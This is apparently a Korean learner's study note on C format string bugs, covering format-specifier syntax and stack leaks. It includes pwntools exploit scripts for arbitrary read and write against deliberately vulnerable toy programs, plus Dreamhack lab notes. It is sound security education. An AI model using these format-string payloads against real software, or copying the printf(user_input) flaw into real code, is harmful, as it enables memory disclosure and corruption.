# Format String Bug

# Memory Corruption: Format String Bug

## 들어가며

---

C 언어에서 문자열을 출력하는 가장 기본적인 함수는 printf이다. printf 함수는 **포맷 스트링(Format String)**을 이용하여 다양한 형태로 값을 출력할 수 있다는 특징이 있다.

C 언어에서 printf 함수 외에도 포맷 스트링을 인자로 사용하는 함수는 많다. 대표적으로 `scanf`, `fprintf`, `fscanf`, `sprintf`, `sscanf`가 있다. 함수의 이름이 “f(formmated)”로 끝나고, 문자열을 다루는 함수라면 포맷 스트링을 처리할 것이라고 추측할 수 있다.

이러한 함수들은 함수 호출 규약에 따라 포맷 스트링에 대응되는 값들을 레지스터와 스택에서 가져오게 된다. 그런데 이 함수들은 내부적으로 포맷 스트링을 필요로 하는 인자의 개수와 함수에 전달된 인자의 개수를 비교하는 루틴이 없다. 따라서 만약 사용자가 직접 포맷 스트링을 입력할 수 있다면, 악의적으로 다수의 인자를 요청하여 레지스터나 스택의 값을 읽어낼 수 있다. 값을 읽는 것 뿐만 아니라 값을 쓸 수도 있게된다.

처음 이 버그가 언급되었을 당시에는 위험도가 낮게 평가되었는데, 1999년에 이 버그를 이용한 익스플로잇이 공개되면서 굉장히 위험한 버그로 재평가 되었다.

# 포맷 스트링

## 포맷 스트링

---

포맷 스트링은 다음과 같이 구성된다. 이 중에서 FSB를 공격하는 데에 가장 중요한 요소 네 가지를 살펴보자.

```c
%[parameter][flags][width][.precision][length][specifier]
```

### Specifier

**형식 지정자(specifier)**는 인자를 어떻게 사용할지 지정한다.

- s : 문자열
- x : 부호 없는 16 진수 정수
- n : 해당하는 위치의 인자에 현재까지 사용된 문자열의 길이를 저장. 값은 출력하지 않음.
- p : void 포인터

다음과 같은 형식 지정자들이 실제 익스플로잇시 활용된다.

### Width

최소 너비를 지정한다. 치환되는 문자열이 이 값보다 짧을 경우, 공백 문자 `' '` 를 문자열 앞에 패딩해준다.

- 정수 : 정수의 값만큼을 최소 너비로 지정한다.
- * : 인자를 두 개 사용한다. 첫 인자의 값만큼을 최소 너비로 지정해 두 번째 인자를 출력한다.

### Length

출력하고자 하는 변수의 크기를 지정하며, d, n 등의 형식 지정자 앞에 쓰인다. 정수 값을 출력하고 싶으나 변수가 int 형이 아닌 경우에 주로 사용한다.

- hh : 형식 지정자가 char 크기임을 나타낸다.
- h : 해당 인자가 short int 크기임을 나타낸다.
- l : 해당 인자가 long int 크기임을 나타낸다.
- ll : 해당 인자가 long long int 크기임을 나타낸다.

### Parameter

참조할 인자의 인덱스를 지정한다. 이 필드는 `%[파라미터]$d` 와 같이 값 뒤에 $ 문자를 붙여 표기한다. 파라미터 값을 사용하면 특정 인덱스의 인자를 사용하는 것이 가능하다. 여기서 중요한 점은 파라미터 값이 전달된 인자의 개수 범위 내인지 확인하지 않는다는 것이다. 예를 들어, 인자가 2개가 들어오더라도 %3$d와 같이 파라미터 값으로 3을 사용하는 것이 가능하다.

아래 예시는 파라미터를 사용해 서로 다른 위치의 인자를 참조해 출력한다.

```c
// Name: fs_param.c
// Compile: gcc -o fs_param fs_param.c

#include <stdio.h>

int main() {
  int num;
  printf("%2$d, %1$d\n", 2, 1);  // "1, 2"
  return 0;
}
```

# 포맷 스트링 버그 - Read

## 포맷 스트링 버그 (FSB)

---

**포맷 스트링 버그(Format String Bug, FSB)**는 포맷 스트링 함수의 잘못된 사용으로 발생하는 버그를 이른다. 포맷 스트링을 사용자가 직접 입력할 수 있을 때, 공격자는 레지스터와 스택을 읽을 수 있고, 임의 주소 읽기 및 쓰기를 할 수 있다.

### 포맷 스트링 버그 - Read

---

**레지스터 및 스택 읽기**

다음 코드는 사용자가 임의의 포맷 스트링을 입력할 수 있는 예제 코드이다.

```c
// Name: fsb_stack_read.c
// Compile: gcc -o fsb_stack_read fsb_stack_read.c

#include <stdio.h>

int main() {
  char format[0x100];
  
  printf("Format: ");
  scanf("%s", format);
  printf(format);
  
  return 0;
}
```

코드를 컴파일 한 후 다음과 같이 `%p/%p/%p/%p/%p/%p/%p/%p` 를 입력해보자.

```c
$ ./fsb_stack_read
Format: %p/%p/%p/%p/%p/%p/%p/%p
0xa/(nil)/0x7f4dad0bbaa0/(nil)/0x55f04ffdc6b0/0x7025207025207025/0x2520702520702520/0x2070252070252070 
```

`printf` 함수에 인자를 전달하지 않았지만 어떤 값들이 출력되었다. 사실 이는 x86-64의 함수 호출 규약에 따라 포맷 스트링을 담고 있는 rdi의 다음 인자인 **rsi, rdx, rcx, r8, r9, [rsp], [rsp+8], [rsp+0x10]**이 출력된 것이다. 이는 printf 함수가 인자 개수를 확인하지 않아서 생기는 현상으로, 실제로는 인자가 넘어오지 않았음에도 호출 규약에 따라 인자를 참조하기 때문에 발생한 것이다.

`printf` 에서 인자는 단순히 레지스터나 stack에 값을 넣는 것만을 한다. 따라서 인자가 존재하지 않더라도 이미 레지스터와 stack에 들어 있는 값으로 출력된다.

### 임의 주소 읽기

앞선 **레지스터 및 스택 읽기** 파트에서 주목할 점은 스택 상의 값을 사용할 수 있다는 것이다. 스택에 어떤 메모리의 주소값이 적혀있다면, 해당 주소에 적혀있는 값을 파라미터 값을 활용해 읽어올 수 있다.

다음 예시를 살펴보자.

```c
// Name: fsb_aar_example.c
// Compile: gcc -o fsb_aar_example fsb_aar_example.c

#include <stdio.h>

char *secret = "THIS IS SECRET";

int main() {
  char *addr = secret;
  char format[0x100];

  printf("Format: ");
  scanf("%s", format);
  printf(format);

  return 0;
}
```

코드를 컴파일 한 후 `main` 함수를 디스어셈블 해보면, `addr`이 `rsp + 8` 위치에, `format` 이 `rsp + 0x10` 위치에 있는 것을 확인할 수 있다.

```c
Dump of assembler code for function main:
   0x0000000000001189 <+0>:     endbr64
   0x000000000000118d <+4>:     push   rbp
   0x000000000000118e <+5>:     mov    rbp,rsp
   0x0000000000001191 <+8>:     sub    rsp,0x120
   0x0000000000001198 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000011a1 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000011a5 <+28>:    xor    eax,eax
   0x00000000000011a7 <+30>:    mov    rax,QWORD PTR [rip+0x2e62]        # 0x4010 <secret>
   0x00000000000011ae <+37>:    mov    QWORD PTR [rbp-0x118],rax
   0x00000000000011b5 <+44>:    lea    rax,[rip+0xe57]        # 0x2013
   0x00000000000011bc <+51>:    mov    rdi,rax
   0x00000000000011bf <+54>:    mov    eax,0x0
   0x00000000000011c4 <+59>:    call   0x1080 <printf@plt>
   0x00000000000011c9 <+64>:    lea    rax,[rbp-0x110]
   0x00000000000011d0 <+71>:    mov    rsi,rax
   0x00000000000011d3 <+74>:    lea    rax,[rip+0xe42]        # 0x201c
   0x00000000000011da <+81>:    mov    rdi,rax
   0x00000000000011dd <+84>:    mov    eax,0x0
   0x00000000000011e2 <+89>:    call   0x1090 <__isoc99_scanf@plt>
   0x00000000000011e7 <+94>:    lea    rax,[rbp-0x110]
   0x00000000000011ee <+101>:   mov    rdi,rax
   0x00000000000011f1 <+104>:   mov    eax,0x0
   0x00000000000011f6 <+109>:   call   0x1080 <printf@plt>
   ...
```

따라서 `printf(format)`을 호출하는 시점에서의 rsp 값을 바탕으로 7번째 인자가 `rsp + 8` 을 나타내는, `%7$s`를 사용하면 `secret` 위치에 적힌 문자열을 출력시킬 수 있다.

이때 알 수 있는 것은 앞에 있는 인자들을 모두 출력할 필요없이 parameter를 사용하면 원하는 인자의 값만 뽑아서 출력할 수 있다는 것이다.

```c
Format: %7$s
THIS IS SECRET
```

이를 응용하면 포맷 스트링을 담는 버퍼에 참조하고 싶은 주소를 같이 넣고, 파라미터 값을 활용해 해당 주소에 적힌 값을 읽을 수 있다.

다음 코드는 앞선 코드에서 약간 변형해, `secret` 주소 값을 알고 있는 상태에서 `secret` 위치의 값을 출력하는 것이 목표이다.

```c
// Name: fsb_aar.c
// Compile: gcc -o fsb_aar fsb_aar.c

#include <stdio.h>

const char *secret = "THIS IS SECRET";

int main() {
  char format[0x100];

  printf("Address of `secret`: %p\n", secret);
  printf("Format: ");
  scanf("%s", format);
  printf(format);

  return 0;
}
```

`main` 함수의 `format` 버퍼는 `rsp` 위치에 존재하고 있다. 이 때 `%7$s` 를 사용하면 `format + 8` 위치에 적힌 값을 문자열로 출력할 것이다.

그러므로 다음과 같은 파이썬 코드를 작성해볼 수 있다.

```c
#!/usr/bin/python3
# Name: fsb_aar.py

from pwn import *

p = process("./fsb_aar")

p.recvuntil(b"`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)

fstring = b"%7$saaaa" # Length: 8
fstring += p64(addr_secret)

p.sendline(fstring)

p.interactive()
```

이를 실행하면 다음과 같이 `secret` 위치의 값을 문자열 형태로 출력하는 것을 확인할 수 있다.

```c
$ python3 fsb_aar.py
[+] Starting local process './fsb_aar': pid 727
[*] Switching to interactive mode
[*] Process './fsb_aar' stopped with exit code 0 (pid 727)
Format: THIS IS SECRETaaaa\x04\xc0\x9[*] Got EOF while reading in interactive
```

### 헷갈렸던 부분

rsp는 함수가 커지면서 가장 낮은 부분에 있는 포인터를 말하는데 왜 format이 rsp인가?

답: printf 함수의 rsp를 말하는게 아니라 main 함수의 rsp를 말하는 것

printf(format) 호출 시 인자 번호 매핑을 보자.

```c
%1$ = RSI    (레지스터)
%2$ = RDX
%3$ = RCX
%4$ = R8
%5$ = R9
%6$ = 첫 번째 스택 슬롯 = format[0:7]
%7$ = 두 번째 스택 슬롯 = format[8:15]
...
```

```c
높은 주소
┌────────────────────────────┐
│  main return addr          │
│  saved RBP                 │
│  canary                    │
│  format[0xF8 ~ 0xFF]      │  
│  ...                       │
│  format[0x10 ~ 0x17]      │  ← %8$
│  format[0x08 ~ 0x0F]      │  ← %7$  ← addr_secret이 여기
│  format[0x00 ~ 0x07]      │  ← %6$  ← "%7$saaaa"
├────────────────────────────┤
│  printf return addr        │  ← RSP
│  printf 내부 프레임         │
└────────────────────────────┘
낮은 주소
```

함수에 인자를 전달할 때 인자는 함수의 스택 내부에 들어가는게 아니라 이전 함수에서 사용한 스택 영역에 존재한다. 따라서 `rsp - 8`이 아니라 `rsp + 8`로 함수 외부 공간에서 가져와서 사용한다. 이때 첫 번째 스택 슬롯이란 함수의 ret 주소 위의 8바이트를 말하는 것이다.

# 포맷 스트링 버그 - Write

## 포맷 스트링 버그 - Write

---

### 임의 주소 쓰기

**임의 주소 읽기**에서와 마찬가지로 포맷 스트링에 임의의 주소를 넣고, %[n]$n의 형식 지정자를 사용하면 그 주소에 데이터를 쓸 수 있다.

다음 코드를 살펴보고, `secret` 값을 31337로 만드는 방법을 생각해보자.

```c
// Name: fsb_aaw.c
// Compile: gcc -o fsb_aaw fsb_aaw.c

#include <stdio.h>

int secret;

int main() {
  char format[0x100];

  printf("Address of `secret`: %p\n", &secret);
  printf("Format: ");
  scanf("%s", format);
  printf(format);
  
  printf("Secret: %d", secret);

  return 0;
}
```

%n의 경우 해당 인자의 주소에 앞에서 나온 문자열의 길이를 넣게된다. 따라서 만약 앞에서 %31337c로 31337 크기의 문자를 출력하게되면 %n이 저장하게 되는 수는 31337이 된다. 이때 %[n]$n으로 원하는 인자를 선택해서 해당 인자의 주소를 통해 값을 저장할 수 있다.

```c
#!/usr/bin/python3
# Name: fsb_aaw.py

from pwn import *

p = process("./fsb_aaw")

p.recvuntil(b"`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)

fstring = b"%31337c%8$n".ljust(16, b'a')
fstring += p64(addr_secret)

p.sendline(fstring)
print(p.recvall())
```

```c
$ python3 ./fsb_aaw.py
[+] Starting local process './fsb_aaw': pid 405241
[+] Receiving all data: Done (30.63KB)                                                                                                                 [*] Process './fsb_aaw' stopped with exit code 0 (pid 405241)
b'Format:
...

                                   \naaaaa\x14\x80\x83\xba(VSecret: 31337'
```

위의 코드를 확인해보면 먼저 8번째 인자에 31337을 넣게 된다. 이후 8번째 인자의 위치에 `secret` 의 주소를 넣게 된다. 따라서 `secret` 에 31337을 값으로 넣게 된다.

이때, `%n`을 사용해서 값을 넣는 경우 지금까지 출력된 글자의 수를 넣기 때문에 지나치게 큰 값은 쓸 수 없다. 만약 %2147488308c%8$n과 같이 큰 값을 쓰게 되면 실제로 2147488308번의 출력이 되어야 한다. 근데 이렇게 실행되려면 printf가 공백 약 2GB를 stdout에 출력해야 한다. 이론적으로는 가능하지만 문제가 있다.

- 시간이 오래 걸림
- remote exploit이면 네트워크로 2GB를 보내야 함
- 값이 더 커지면 (예: libc 주소 0x0x7f1234567890) 사실상 불가능

따라서 이런 경우 n앞에 h와 hh를 붙여서 2바이트, 1 바이트씩 쓰는 것을 생각해봐야 한다. 한번에 보낼 경우 최악의 경우 2^(8*8)-1 = 2^64 - 1 바이트를 보내야 된다(0xFFFFFFFF). 하지만 1 바이트씩 보낼 경우 최악의 경우 (2^8 - 1) * 8 = 2040 바이트만 보내면 되므로 훨씬 작아지게된다(0xFF).

이 사실을 이용해서 0xdeadbeef를 써보자. 이 때 `%n` 은 지금까지 출력된 글자 수를 이용하기 때문에 각 바이트를 `%hhn` 을 통해서 넣을 때 오름차순 순서대로 쓰는 것이 중요하다. 0xdeadbeef의 경우, 0xad → 0xbe → 0xde → 0xef 순으로 한 바이트씩 작성하면 된다.

```c
#!/usr/bin/python3
# Name: fsb_aaw_deadbeef.py

from pwn import *

p = process("./fsb_aaw")

p.recvuntil(b"`secret`: ")
addr_secret = int(p.recvline()[:-1], 16)

fstring = f"%{0xad}c%16$hhn".encode()
fstring += f"%{0xbe - 0xad}c%15$hhn".encode()
fstring += f"%{0xde - 0xbe}c%17$hhn".encode()
fstring += f"%{0xef - 0xde}c%14$hhn".encode()
fstring = fstring.ljust(64, b'a')
fstring += p64(addr_secret) # %14$n
fstring += p64(addr_secret + 1) # %15$n
fstring += p64(addr_secret + 2) # %16$n
fstring += p64(addr_secret + 3) # %17$n

p.sendline(fstring)
print(p.recvall())
```

```c
$ python3 ./fsb_aaw_deadbeef.py
[+] Starting local process './fsb_aaw': pid 453912
[+] Receiving all data: Done (290B)
[*] Process './fsb_aaw' stopped with exit code 0 (pid 453912)
b'Format:
                               \n                \x00                               \xa0                \x00aaaaaaaaaaaaaaaaaaa\x14\x10+\x1dKVSecret: -559038737'
```

이때 값을 바로 쓰는 것이 아닌 해당 주소로 이동한 뒤 쓰기 때문에 8바이트씩 인자를 이동하여도 값을 1바이트씩 쓰는 것이 가능하다.

0x404040에 1바이트로 ad를 쓰고, 0x404041에 1바이트로 de를 쓰면, dead를 쓸 수 있게된다. 0x404040이 변하는 것이 아닌, 0x404040의 주소에 들어있는 값을 변경하는 것이므로 가능하다.

# 포맷 스트링 버그 - Read Lab

## 포맷 스트링 버그 - Read Lab

---

https://learn.dreamhack.io/labs/28536e80-9bce-49de-a593-a1cdd58ecc4c

포맷 스트링 버그를 발생시킬 수 있는데, flag가 8바이트만큼 떨어져 있으므로 7번째 인자 자리에 해당한다. 따라서 %p를 7번 반복한 문자열을 보내 flag를 구할 수 있다.

처음에 %7$s를 사용했는데, %s의 경우 해당 값을 바로 출력하는게 아닌, 해당 값을 주소로 해석하여 그 주소에서 값을 가져오려고 하므로 작동하지 않는다.

# 포맷 스트링 버그 - Write Lab

## 포맷 스트링 버그 - Write Lab

---

https://learn.dreamhack.io/labs/0e9718f8-a3a9-4010-b05b-a40d3fd86e3f

두번째 문제를 풀때 한번 hn으로 받고 그다음을 어떻게 받아야할지 고민했는데, 두번의 입력을 한번에 받으면 된다. %11$hn%12$hn으로 한번에 받으면 글자수가 늘어나지 않고 똑같게 한번에 받을 수 있다.

# 생각난 점

## %s와 %n

---

포맷 스트링 버그를 일으킬 때 %s와 %n이 많이 쓰이는데, 이 두 specifier들은 해당 하는 값을 바로 쓰는게 아니라 해당하는 부분을 주소로 사용하여 그 주소에 있는 값을 쓰므로 활용할 수 있는 부분이 많다.

# 실습

## Exploit tech

---

[Exploit tech: Format String Bug](https://www.notion.so/Exploit-tech-Format-String-Bug-36ca9179d3af80afa42be0f2766b9ff9?pvs=21)